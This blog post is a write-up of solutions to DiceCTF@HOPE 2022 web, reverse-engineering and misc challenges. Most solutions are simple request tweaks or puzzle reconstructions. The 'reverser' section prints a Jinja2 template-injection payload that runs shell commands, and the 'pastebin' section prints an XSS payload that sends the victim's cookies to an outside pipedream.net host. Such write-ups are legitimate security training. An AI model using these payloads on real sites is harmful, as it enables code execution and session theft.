---
title: "DiceCTF@HOPE"
date: 2022-07-25T01:38:39+09:00
tags: ["DiceCTF", "web", "rev", "misc"]
draft: false
---

# Challenges
## [web]secure-page
```python
...
    if admin == '':
        headers['set-cookie'] = 'admin=false'

    if admin == 'true':
        return (200, '''
            <title>Secure Page</title>
            <link rel="stylesheet" href="/style.css" />
            <div class="container">
                <h1>Secure Page</h1>
                %s
            </div>
        ''' % os.environ.get('FLAG', 'flag is missing!'), headers)
...
```
Just set `Cookie: admin=true` in the Header and send request.

```none
curl -H 'Cookie: admin=true' https://secure-page.mc.ax
hope{signatures_signatures_signatures}
```

## [web]reverser
Template Injection is likely to occur at the following.
```python
@app.post('/')
def reverse():
...
    output = request.form.get('text', '')[::-1]
    return render_template_string(result % output)
```

Also, note that `output` is reversed and then write payload.

```python
i = "{{url_for.__globals__.os.popen('cat flag-f5953883-3dae-4a0f-9660-d00b50ff4012.txt').read()}}"
print(i[::-1])
# => }})(daer.)'txt.2104ff05b00d-0669-f0a4-ead3-3883595f-galf tac'(nepop.so.__slabolg__.rof_lru{{
```

FLAG : `hope{cant_misuse_templates}`

## [web]flag-viewer
Note that you see the all response with `--verbose` option.
```none
curl --verbose -d 'user=admin' -X POST https://flag-viewer.mc.ax/flag
...
< location: /?message=hope%7Boops_client_side_validation_again%7D
...
```

Flag : `hope{oops_client_side_validation_again}`

## [web]pastebin
(adminbot.js)
```javascript
await page.setCookie({ name: 'flag', value: flag.trim(), domain: 'pastebin.mc.ax' })
```
Overwrite `location` with XSS because when adminbot access the page with the same name as HOST name, set the Cookie.

There is XSS at `message` query in the `/flash`.

(index.js)
```javascript
app.get('/flash', (req, res) => {
  const message = req.query.message ?? '';
  res.set('set-cookie', `error=${message}`);
  res.redirect('/');
});
```

Input the URL to input-box in `https://admin-bot.mc.ax/pastebin`.
```none
https://pastebin.mc.ax/flash?message=<script>location=`https://eoyyukk2qvix5xq.m.pipedream.net?cookie=${document.cookie}`</script>
```

## [web]point
```go
type importantStuff struct {
	Whatpoint string `json:"what_point"`
}
...
if strings.Contains(string(body), "what_point") || strings.Contains(string(body), "\\") {
	fmt.Fprintf(w, "Something went wrong")
	return
}
...
if whatpoint.Whatpoint == "that_point" {
	fmt.Fprintf(w, "Congrats! Here is the flag: %s", flag)
	return
}
```

I thought just send `{"what_point":"that_point"}` but, I can't use `what_point` because it filterd.

However, to check specification of JSON of Golang, it seems to be able to use struct`What_point`.
```none
curl -X POST -d '{"What_point":"that_point"}' https://point.mc.ax
Congrats! Here is the flag: hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT}
```

FLAG : `hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT}`

## [rev]slices
```python
...
if len(flag) != 32: fail()

if flag[:5] != 'hope{': fail()
if flag[-1] != '}': fail()
if flag[5::3] != 'i0_tnl3a0': fail()
if flag[4::4] != '{0p0lsl': fail()
if flag[3::5] != 'e0y_3l': fail()
if flag[6::3] != '_vph_is_t': fail()
if flag[7::3] != 'ley0sc_l}': fail()
...

```

The string that satisfies the following conditions.
- flag length is 32.
- `i0_tnl3a0` is placed at a multiple of 3 from the fifth character.
- the same applies hereafter

Generate the string that satisfies it.
```python
flag = ['']*32
f = 'hope{'
for i in range(32):
    if i < 5:
        flag[i] = f[i]
    if i == 31:
        flag[i] = '}'

f0 = 'i0_tnl3a0'
a_f0 = []
fi = 0
for i in range(32-5):
    if i % 3 == 0:
        a_f0.append(f0[fi])
        fi += 1
flag[5::3] = a_f0

f1 = '{0p0lsl'
a_f1 = []
se = 0
for i in range(32-4):
    if i % 4 == 0:
        a_f1.append(f1[se])
        se += 1
flag[4::4] = a_f1

f2 = 'e0y_3l'
a_f2 = []
th = 0
for i in range(32-3):
    if i % 5 == 0:
        a_f2.append(f2[th])
        th += 1
flag[3::5] = a_f2

f3 = '_vph_is_t'
a_f3 = []
fo = 0
for i in range(32-6):
    if i % 3 == 0:
        a_f3.append(f3[fo])
        fo += 1
flag[6::3] = a_f3

f4 = 'ley0sc_l}'
a_f4 = []
fif = 0
for i in range(32-7):
    if i % 3 == 0:
        a_f4.append(f4[fif])
        fif += 1
flag[7::3] = a_f4

print(''.join(flag))
```
FLAG : `hope{i_l0ve_pyth0n_slic3s_a_l0t}`

## [rev]sequence
It is analysed by Ghidra and formatted to show variable names, etc.

```
...
  else if (a_input[0] == 0xc) {
    for (i = 1; i < 6; i = i + 1) {
      num = a_input[i + -1] * 3 + 7;
      mask = (uint)(num >> 0x1f) >> 0x1c;
      if (a_input[i] != (num + mask & 0xf) - mask) {
        isTrue = 0;
        goto LAB_00101305;
      }
    }
...
```

Just generate 6 numbers that satisfy these.
```c
#include <stdio.h>
int main(void) {
    int num;
    int mask;
    int input[6] = {0xc, 0x0, 0x0, 0x0, 0x0, 0x0};
    for(int i = 1; i < 6; i++){
        num = input[i - 1] * 3 + 7;
        mask = (num >> 0x1f) >> 0x1c;
        input[i] = (num + mask & 0xf) - mask;
    }
    for(int i = 0; i < 6; i++)
        printf("%d ", input[i]);
}

//=> 12 11 8 15 4 3
```

FLAG : `hope{definitely_solvable_with_angr}`

## [misc]orphan
Move to commit hash that added `flag` and then just see `flag.txt`.

```none
$ cat .git/logs/HEAD
0000000000000000000000000000000000000000 2ce03bc4ae69cd194b7680b18172641f7d56fbbf William Wang <defund@users.noreply.github.com> 1658084429 -0400       commit (initial): add foo
0000000000000000000000000000000000000000 2ce03bc4ae69cd194b7680b18172641f7d56fbbf William Wang <defund@users.noreply.github.com> 1658084534 -0400       checkout: moving from flag to main
0000000000000000000000000000000000000000 b53c9e6864ed176ea0192fd8283362a41d94906c William Wang <defund@users.noreply.github.com> 1658084626 -0400       commit (initial): add flag
b53c9e6864ed176ea0192fd8283362a41d94906c 2ce03bc4ae69cd194b7680b18172641f7d56fbbf William Wang <defund@users.noreply.github.com> 1658084645 -0400       checkout: moving from flag to main

$ g checkout b53c9e6864ed176ea0192fd8283362a41d94906c
$ cat flag.txt
hope{ba9f11ecc3497d9993b933fdc2bd61e5}
```
